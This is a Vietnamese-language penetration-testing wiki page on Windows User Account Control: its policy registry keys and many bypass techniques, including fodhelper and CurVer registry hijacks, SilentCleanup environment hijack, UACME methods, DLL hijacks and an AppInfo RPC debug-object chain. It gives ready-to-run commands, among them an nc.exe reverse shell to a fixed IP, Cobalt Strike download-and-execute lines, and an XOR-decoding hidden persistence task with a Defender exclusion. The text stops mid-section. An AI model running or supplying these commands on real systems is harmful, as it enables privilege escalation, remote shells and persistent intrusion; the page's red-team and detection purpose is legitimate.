# UAC - Kiểm soát Tài khoản Người dùng

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Kiểm soát Tài khoản Người dùng (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) là một tính năng hiển thị **lời nhắc xác nhận đối với các hoạt động cần nâng quyền**. Các ứng dụng có các mức `integrity` khác nhau, và một chương trình có **mức cao** có thể thực hiện những tác vụ **có khả năng làm tổn hại hệ thống**. Khi bật UAC, các ứng dụng và tác vụ luôn **chạy trong ngữ cảnh bảo mật của tài khoản không phải quản trị viên**, trừ khi quản trị viên cho phép rõ ràng các ứng dụng/tác vụ đó có quyền truy cập cấp quản trị viên vào hệ thống để chạy. Đây là một tính năng tiện ích giúp bảo vệ quản trị viên khỏi những thay đổi ngoài ý muốn, nhưng không được xem là ranh giới bảo mật.<sup>[[2]](#references)</sup>

Để biết thêm thông tin về các mức integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Khi UAC được bật, người dùng quản trị viên sẽ được cấp 2 token: một token người dùng tiêu chuẩn để thực hiện các thao tác thông thường ở mức integrity trung bình, và một token có quyền quản trị viên.

[Trang này](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) thảo luận rất chi tiết về cách UAC hoạt động, bao gồm quy trình đăng nhập, trải nghiệm người dùng và kiến trúc UAC.<sup>[[2]](#references)</sup> Quản trị viên có thể sử dụng các chính sách bảo mật để cấu hình cách UAC hoạt động phù hợp với tổ chức ở cấp cục bộ (bằng secpol.msc), hoặc cấu hình rồi triển khai qua Group Policy Objects (GPO) trong môi trường domain Active Directory. Các cài đặt khác nhau được thảo luận chi tiết [tại đây](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Có 10 cài đặt Group Policy có thể được thiết lập cho UAC. Bảng sau cung cấp thêm chi tiết:

| Cài đặt Group Policy                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Cài đặt mặc định                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kiểm soát Tài khoản Người dùng: Chế độ phê duyệt của quản trị viên cho tài khoản Administrator tích hợp sẵn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Đã tắt)                                             |
| [Kiểm soát Tài khoản Người dùng: Cách xử lý lời nhắc nâng quyền đối với quản trị viên ở Chế độ phê duyệt của quản trị viên](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Yêu cầu xác nhận đối với tệp nhị phân không phải Windows trên secure desktop) |
| [Kiểm soát Tài khoản Người dùng: Cách xử lý lời nhắc nâng quyền đối với người dùng tiêu chuẩn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Yêu cầu thông tin xác thực trên secure desktop)         |
| [Kiểm soát Tài khoản Người dùng: Phát hiện cài đặt ứng dụng và yêu cầu nâng quyền](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Đã bật; mặc định tắt trên Enterprise)           |
| [Kiểm soát Tài khoản Người dùng: Chỉ nâng quyền cho các tệp thực thi đã được ký và xác thực](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Đã tắt)                                             |
| [Kiểm soát Tài khoản Người dùng: Chỉ nâng quyền cho các ứng dụng UIAccess được cài đặt ở vị trí an toàn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Đã bật)                                              |
| [Kiểm soát Tài khoản Người dùng: Chạy tất cả quản trị viên ở Chế độ phê duyệt của quản trị viên](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Đã bật)                                              |
| [Kiểm soát Tài khoản Người dùng: Cho phép ứng dụng UIAccess yêu cầu nâng quyền mà không dùng secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Đã tắt)                                             |
| [Kiểm soát Tài khoản Người dùng: Chuyển sang secure desktop khi yêu cầu nâng quyền](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Đã bật)                                              |
| [Kiểm soát Tài khoản Người dùng: Ảo hóa lỗi ghi tệp và registry vào các vị trí riêng cho từng người dùng](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Đã bật)                                              |

### Chính sách cài đặt phần mềm trên Windows

**Các chính sách bảo mật cục bộ** (trên hầu hết hệ thống là "secpol.msc") được cấu hình mặc định để **ngăn người dùng không phải quản trị viên cài đặt phần mềm**. Điều này có nghĩa là dù người dùng không phải quản trị viên có thể tải trình cài đặt phần mềm của bạn xuống, họ cũng không thể chạy nó nếu không có tài khoản quản trị viên.

### Registry Key để buộc UAC yêu cầu nâng quyền

Là người dùng tiêu chuẩn không có quyền quản trị viên, bạn có thể đảm bảo tài khoản "tiêu chuẩn" **được UAC yêu cầu cung cấp thông tin xác thực** khi cố thực hiện một số thao tác nhất định. Thao tác này cần sửa một số **registry key**, việc đó đòi hỏi quyền quản trị viên, trừ khi có **UAC bypass**, hoặc kẻ tấn công đã đăng nhập với quyền quản trị viên.

Ngay cả khi người dùng thuộc nhóm **Administrators**, những thay đổi này vẫn buộc người dùng **nhập lại thông tin xác thực tài khoản** để thực hiện các thao tác quản trị.

**Trên thực tế, việc này chỉ hữu ích khi bạn đã có token được nâng quyền, UAC bypass hoặc có cấu hình sai cho phép bạn thay đổi các key này; nếu không, thao tác ghi vào registry sẽ bị chặn.**

Các registry key và mục cần thay đổi như sau (giá trị mặc định nằm trong ngoặc đơn):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Bạn cũng có thể thực hiện việc này thủ công bằng công cụ Local Security Policy. Sau khi thay đổi, các thao tác quản trị sẽ yêu cầu người dùng nhập lại thông tin xác thực.

### Lưu ý

**User Account Control không phải là ranh giới bảo mật.** Vì vậy, người dùng tiêu chuẩn không thể thoát khỏi tài khoản của mình và giành quyền quản trị viên nếu không có exploit leo thang đặc quyền cục bộ.

### Yêu cầu người dùng 'toàn quyền truy cập máy tính'

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Đặc quyền UAC

- Internet Explorer Protected Mode sử dụng các kiểm tra mức toàn vẹn để ngăn các tiến trình có mức toàn vẹn cao (như trình duyệt web) truy cập dữ liệu có mức toàn vẹn thấp (như thư mục Temporary Internet Files). Việc này được thực hiện bằng cách chạy trình duyệt với token có mức toàn vẹn thấp. Khi trình duyệt cố truy cập dữ liệu được lưu trong vùng có mức toàn vẹn thấp, hệ điều hành sẽ kiểm tra mức toàn vẹn của tiến trình và cấp quyền truy cập phù hợp. Tính năng này giúp ngăn các cuộc tấn công thực thi mã từ xa truy cập dữ liệu nhạy cảm trên hệ thống.
- Khi người dùng đăng nhập vào Windows, hệ thống tạo một access token chứa danh sách đặc quyền của người dùng. Đặc quyền là sự kết hợp giữa quyền và khả năng của người dùng. Token cũng chứa danh sách thông tin xác thực của người dùng; đây là thông tin được dùng để xác thực người dùng với máy tính và các tài nguyên trên mạng.

### Autoadminlogon

Để cấu hình Windows tự động đăng nhập một người dùng cụ thể khi khởi động, hãy đặt **registry key `AutoAdminLogon`**. Tính năng này hữu ích trong môi trường kiosk hoặc khi kiểm thử. Chỉ sử dụng tính năng này trên các hệ thống an toàn vì mật khẩu sẽ bị lộ trong registry.

Đặt các key sau bằng Registry Editor hoặc `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Để khôi phục cách đăng nhập thông thường, đặt `AutoAdminLogon` thành 0.

## UAC bypass

> [!TIP]
> Lưu ý rằng nếu bạn có quyền truy cập giao diện đồ họa của máy nạn nhân, UAC bypass rất đơn giản vì bạn chỉ cần nhấp vào "Yes" khi lời nhắc UAC xuất hiện

UAC bypass cần thiết trong trường hợp sau: **UAC đang được bật, process của bạn đang chạy trong ngữ cảnh có mức toàn vẹn trung bình và người dùng của bạn thuộc nhóm administrators**.

Điều quan trọng cần lưu ý là **bypass UAC khó hơn nhiều nếu UAC đang ở mức bảo mật cao nhất (Always) so với các mức khác (Default).**

### Phân loại nhanh từ shell có mức toàn vẹn trung bình

Trước khi thử bypass, hãy xác nhận bạn đang ở đúng tình huống và xác định build của máy chủ để tìm các phương pháp đã biết là hoạt động:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Ghi chú thực tế:
- Nếu `EnableLUA=0`, bạn không cần bypass: bất kỳ admin token nào cũng có thể trực tiếp yêu cầu mức toàn vẹn cao.
- `ConsentPromptBehaviorAdmin=2` hoặc `5` là kịch bản phổ biến đối với các bypass auto-elevate / dựa trên COM.
- `Always Notify` làm tăng độ khó, nhưng bạn vẫn nên kiểm tra chính xác build thay vì mặc định rằng sẽ thất bại: UACME vẫn theo dõi một số phương thức `AlwaysNotify compatible` trên các build Windows hiện đại.<sup>[[3]](#references)</sup>

### UAC bị tắt

Nếu UAC đã bị tắt (`ConsentPromptBehaviorAdmin` là **`0`**), bạn có thể **thực thi reverse shell với quyền quản trị** (mức toàn vẹn cao) bằng cách dùng lệnh như:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass với token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + reusable debug object

Giao diện local RPC của AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` có thể tạo process với debugging được bật. Các process được tạo bằng debugging trên cùng thread sẽ dùng chung debug object của thread; một creation debug event mang theo process handle có quyền truy cập đầy đủ, ngay cả khi kết quả RPC chỉ cấp quyền truy cập hạn chế. Điều này biến việc tái sử dụng debug object thành một primitive UAC cho thành viên nhóm Administrators có mức integrity trung bình.<sup>[[11]](#references)[[12]](#references)</sup>

Một chuỗi thực hiện thực tế là:<sup>[[11]](#references)[[12]](#references)</sup>

1. Gọi phương thức local RPC (trực tiếp hoặc qua `NdrAsyncClientCall`) để tạo một process hy sinh không được elevated, với debugging được bật.
2. Truy vấn `ProcessDebugObjectHandle` bằng `NtQueryInformationProcess`, detach nó bằng `NtRemoveProcessDebug`, giữ lại object rồi terminate process hy sinh.
3. Dùng cùng giao diện RPC để tạo một process auto-elevated đáng tin cậy, sau đó gắn object đã lưu với thread gọi thông qua `DbgUiSetThreadDebugObject`.
4. Gọi `WaitForDebugEvent` và lấy process handle từ `CREATE_PROCESS_DEBUG_EVENT`; duplicate handle này bằng `NtDuplicateObject` trước khi tiếp tục.
5. Cung cấp handle đã duplicate cho `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` và khởi chạy payload bằng cấu trúc startup-info mở rộng. Cách này vừa tái sử dụng ngữ cảnh của process elevated, vừa khiến process cha của child có vẻ đáng tin cậy.

Hãy tìm chuỗi thao tác ngắn này, thay vì chỉ tìm binary auto-elevated: tạo process qua local AppInfo RPC, truy vấn `ProcessDebugObjectHandle`, detach/reattach debugger, nhận creation-debug event ngay sau đó, duplicate handle, và một child có parent được ghi nhận không trùng với process đã gọi các API tạo process.<sup>[[12]](#references)</sup>

### **Very** Basic UAC "bypass" (toàn quyền truy cập file system)

Nếu bạn có shell với một user thuộc nhóm Administrators, bạn có thể **mount** shared **C$** qua SMB (file system) vào một ổ đĩa mới trên máy local và sẽ có **quyền truy cập mọi thứ bên trong file system** (kể cả thư mục home của Administrator).

> [!WARNING]
> **Có vẻ như thủ thuật này không còn hoạt động nữa**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass với Cobalt Strike

Các kỹ thuật của Cobalt Strike chỉ hoạt động nếu UAC không được đặt ở mức bảo mật cao nhất.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** và **Metasploit** cũng có một số module để **bypass** **UAC**.

### Giao diện COM được nâng quyền tự động (`ICMLuaUtil` / `CMSTPLUA`)

Các đối tượng COM được nâng quyền tự động vẫn là một bề mặt UAC thực tế trên các bản dựng hiện đại. UACME vẫn ghi nhận `ICMLuaUtil` là hoạt động trên các nhánh Windows hiện tại, còn các công cụ tấn công liên tục điều chỉnh `CMSTPLUA` bằng cách kết hợp một tiến trình trên desktop tương tác, thực thi 64-bit và đôi khi giả mạo PEB/tiến trình trước khi gọi COM Elevation Moniker.<sup>[[3]](#references)</sup>

Mẹo thực tế:
- Ưu tiên tiến trình **64-bit** trong **phiên tương tác** của người dùng (thường là `explorer.exe` hoặc tiến trình con của nó).
- Nếu shell thô không hoạt động, hãy thử lại bằng triển khai BOF / UACME thay vì một wrapper `CreateProcess` đơn giản.
- Dự kiến tiến trình con sẽ chạy trong một **tiến trình được nâng quyền riêng biệt**; nhiều BOF không nâng quyền cho beacon hiện tại ngay trong tiến trình đó.

### KRBUACBypass

Tài liệu và công cụ tại [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Khai thác bypass UAC

[**UACME**](https://github.com/hfiref0x/UACME) là tập hợp các kỹ thuật bypass UAC. Biên dịch bằng Visual Studio hoặc MSBuild; quá trình build tạo ra một số tệp thực thi (ví dụ: `Source\Akagi\output\x64\Debug\Akagi.exe`), vì vậy hãy chọn phương thức phù hợp với bản dựng mục tiêu.<sup>[[3]](#references)</sup>\
Hãy cẩn thận: một số kỹ thuật bypass khởi chạy chương trình hiển thị hoặc lời nhắc có thể khiến người dùng chú ý.<sup>[[3]](#references)</sup>

UACME có **phiên bản build bắt đầu hỗ trợ từng kỹ thuật**.<sup>[[3]](#references)</sup> Bạn có thể tìm kiếm kỹ thuật ảnh hưởng đến các phiên bản của mình:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Ngoài ra, sử dụng [trang này](https://en.wikipedia.org/wiki/Windows_10_version_history), bạn có thể xác định Windows release `1607` từ các phiên bản build.

Quy trình thực tế là trước tiên **đánh giá build của host**, rồi mới thực hiện method phù hợp:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` nhanh chóng so sánh build cục bộ với các phương thức UAC đã biết, hữu ích để nhanh chóng loại bỏ các PoC không còn hoạt động.<sup>[[4]](#references)</sup>
- `UACME` vẫn là danh mục công khai tốt nhất để xác định chính xác build tương ứng với một bypass. Phiên bản 3.7.1 bổ sung các phương thức 83–85, trong khi bản phát hành trước đó kiểm thử lại các phương thức hiện có trên **Windows 11 25H2**; hãy kiểm tra lại bảng phương thức và ghi chú phát hành thay vì cho rằng PoC cũ vẫn áp dụng nguyên trạng.<sup>[[3]](#references)[[9]](#references)</sup>

### Các chuỗi WNF/UIAccess tương thích với Always Notify (UACME 3.7.1)

`Always Notify` không loại bỏ mọi UAC bypass. UACME 3.7.1 triển khai ba phương thức x64 mới, kết hợp trạng thái môi trường/giao thức do người dùng kiểm soát với hành vi của scheduled task hoặc UIAccess được nâng quyền, đồng thời đánh dấu cả ba là `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** chuyển hướng `SystemRoot` để tác vụ `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` được kích hoạt qua WNF khiến `taskhostw.exe` chạy với quyền nâng cao side-load `unifiedconsent.dll`. UACME theo dõi phương thức này từ Windows 10 build 19041.
- **84 — TabTip:** dùng cùng primitive biến môi trường với UIAccess `TabTip.exe`, tiến trình này tải `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` hoặc `rsaenh.dll` tùy theo build, rồi pivot từ ngữ cảnh UIAccess có mức toàn vẹn cao vừa tạo ra. UACME theo dõi phương thức này từ Windows 8.1 / Server 2016.
- **85 — Narrator:** chiếm quyền protocol `feedback-hub` theo từng người dùng, điều khiển Narrator bằng `Alt+CapsLock+F`, rồi khởi chạy một bản sao `osk.exe` có thể ghi để side-load `OskSupport.dll`. Phương thức này yêu cầu desktop tương tác và được theo dõi từ Windows 10 1809 / Server 2019.

Sau khi build các payload unit và Akagi theo tài liệu của UACME, gọi số phương thức tương ứng (lệnh tùy chọn mặc định là `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Methods 84 và 85 phụ thuộc vào UIAccess/tương tác với desktop, vì vậy đừng kỳ vọng chúng hoạt động nguyên trạng từ Session 0 hoặc shell dịch vụ không tương tác. Cả ba đều thao tác với trạng thái môi trường/giao thức và chuẩn bị DLL; hãy kiểm tra implementation và xóa các artifact đó sau khi kiểm thử.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary đáng tin cậy `fodhelper.exe` được auto-elevate trên các phiên bản Windows hiện đại. Khi được khởi chạy, nó truy vấn đường dẫn registry theo người dùng bên dưới mà không xác thực verb `DelegateExecute`. Đặt một lệnh tại đó cho phép một process có Medium Integrity (người dùng thuộc nhóm Administrators) khởi chạy process có High Integrity mà không hiện lời nhắc UAC.

Đường dẫn registry được fodhelper truy vấn:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Các bước PowerShell (đặt payload của bạn, rồi kích hoạt)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Lưu ý:
- Hoạt động khi người dùng hiện tại là thành viên của Administrators và mức UAC là mặc định/dễ dãi (không phải Always Notify kèm các hạn chế bổ sung).
- Dùng đường dẫn `sysnative` để khởi chạy PowerShell 64-bit từ tiến trình 32-bit trên Windows 64-bit.
- Payload có thể là bất kỳ lệnh nào (PowerShell, cmd hoặc đường dẫn EXE). Tránh các giao diện nhắc xác nhận để hoạt động kín đáo.

#### Biến thể chiếm quyền CurVer/extension (chỉ HKCU)

Các mẫu gần đây lạm dụng `fodhelper.exe` tránh dùng `DelegateExecute`, thay vào đó **chuyển hướng ProgID `ms-settings`** thông qua giá trị `CurVer` theo người dùng. Binary tự động nâng quyền vẫn phân giải handler trong `HKCU`, nên không cần token admin để tạo các key:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Sau khi được nâng quyền, malware thường **vô hiệu hóa các lời nhắc sau này** bằng cách đặt `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` thành `0`, sau đó thực hiện thêm các thao tác né tránh phòng thủ (ví dụ: `Add-MpPreference -ExclusionPath C:\ProgramData`) và tạo lại cơ chế persistence để chạy với mức toàn vẹn cao. Một tác vụ persistence điển hình lưu **script PowerShell được mã hóa XOR** trên đĩa rồi giải mã và thực thi trong bộ nhớ mỗi giờ:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Biến thể này vẫn dọn sạch dropper và chỉ để lại các payload đã được staging, khiến việc phát hiện phụ thuộc vào giám sát **`CurVer` hijack**, hành vi can thiệp `ConsentPromptBehaviorAdmin`, việc tạo exclusion trong Defender hoặc các scheduled task giải mã PowerShell trong bộ nhớ.<sup>[[5]](#references)</sup>

### Bypass UAC qua task `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` khởi chạy `cleanmgr.exe` với quyền cao nhất và mở rộng `%windir%` từ môi trường của người dùng. Nếu kiểm soát được `HKCU\Environment\windir`, bạn có thể chuyển hướng việc mở rộng đó sang một lệnh tùy ý và đạt mức toàn vẹn cao mà không cần hộp thoại xác nhận.<sup>[[8]](#references)</sup> Phương pháp này vẫn đáng để kiểm thử trên các bản dựng gần đây vì UACME vẫn duy trì kỹ thuật này, và theo dõi các issue gần đây cho thấy Windows 11 24H2 có thể chỉ cần điều chỉnh nhỏ về dấu ngoặc kép.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Nếu tác vụ trích dẫn đường dẫn trên bản build đó, hãy thử lại với payload kết thúc bằng dấu ngoặc kép (ví dụ `cmd.exe"`). Luôn dọn sạch `HKCU\Environment\windir` sau khi kiểm thử.

#### Thêm các cách bypass UAC

Nhiều cách bypass UAC cổ điển khai thác luồng giao diện, COM object hoặc tương tác với desktop đòi hỏi phải có **phiên tương tác đầy đủ** với nạn nhân; shell `nc.exe` thông thường hoặc dịch vụ chạy trong **Session 0** thường là chưa đủ.

Bạn thường có thể giải quyết việc này bằng một phiên **meterpreter**. Migrate sang một **process** có giá trị **Session** bằng **1**:

![Trỏ ms-settings đến một extension tùy chỉnh (.thm) và ánh xạ extension đó đến payload của chúng ta - Thêm các cách bypass UAC: Có thể thực hiện bằng phiên meterpreter. Migrate sang một process có Session...](<../../images/image (863).png>)

(_explorer.exe_ sẽ hoạt động)

### Bypass UAC bằng GUI

Nếu bạn có quyền truy cập **GUI, bạn có thể chỉ cần chấp nhận lời nhắc UAC** khi nó xuất hiện; thực ra bạn không cần bypass kỹ thuật. Vì vậy, có được một phiên GUI thường là đủ để vượt qua trở ngại thực tế do UAC tạo ra.

Ngoài ra, nếu bạn có được phiên GUI mà ai đó đang sử dụng (có thể qua RDP), sẽ có **một số công cụ đang chạy với quyền administrator** mà bạn có thể dùng để **chạy** chẳng hạn như một **cmd** trực tiếp **với quyền admin** mà không bị UAC nhắc lại, ví dụ [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cách này có thể **stealthy** hơn một chút.

### Bypass UAC brute-force gây nhiều tiếng động

Nếu chấp nhận được việc tạo ra tiếng động, một công cụ như [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) có thể liên tục yêu cầu nâng quyền cho đến khi người dùng chấp nhận.

### Tự tạo bypass - Phương pháp cơ bản để bypass UAC

Nếu xem **UACME**, bạn sẽ thấy rằng **nhiều cách bypass UAC khai thác DLL hijacking** (thường bằng cách khiến một binary đã được nâng quyền tải DLL do attacker kiểm soát từ một đường dẫn có thể ghi). [Đọc nội dung này để tìm hiểu cách tìm lỗ hổng DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tìm một binary sẽ **autoelevate** (kiểm tra xem khi được thực thi, nó có chạy ở mức integrity cao hay không).
2. Dùng procmon tìm các sự kiện "**NAME NOT FOUND**" có thể khai thác bằng **DLL Hijacking**.
3. Có thể bạn sẽ cần **ghi** DLL vào một số **đường dẫn được bảo vệ** (như C:\Windows\System32), nơi bạn không có quyền ghi. Bạn có thể bypass việc này bằng:
   1. **wusa.exe**: Windows 7, 8 và 8.1. Công cụ này cho phép giải nén nội dung của file CAB vào các đường dẫn được bảo vệ (vì công cụ chạy ở mức integrity cao).
   2. **IFileOperation**: Windows 10.
4. Chuẩn bị một **script** để sao chép DLL vào đường dẫn được bảo vệ rồi thực thi binary dễ bị tấn công và tự động nâng quyền.

### Một kỹ thuật bypass UAC khác

Kỹ thuật này bao gồm việc theo dõi xem một **binary autoElevated** có cố **đọc** từ **registry** **tên/đường dẫn** của một **binary** hoặc **command** cần **thực thi** hay không (sẽ đáng chú ý hơn nếu binary tìm thông tin này trong **HKCU**).

### Bypass UAC qua `SysWOW64\iscsicpl.exe` + DLL hijack bằng `PATH` của user

`C:\Windows\SysWOW64\iscsicpl.exe` bản 32-bit là một binary **tự động nâng quyền** có thể bị khai thác để tải `iscsiexe.dll` theo thứ tự tìm kiếm. Nếu bạn có thể đặt một `iscsiexe.dll` độc hại trong thư mục **user-writable**, rồi sửa `PATH` của user hiện tại (ví dụ qua `HKCU\Environment\Path`) để thư mục đó được tìm kiếm, Windows có thể tải DLL của attacker vào process `iscsicpl.exe` đã được nâng quyền **mà không hiển thị lời nhắc UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Lưu ý thực tế:
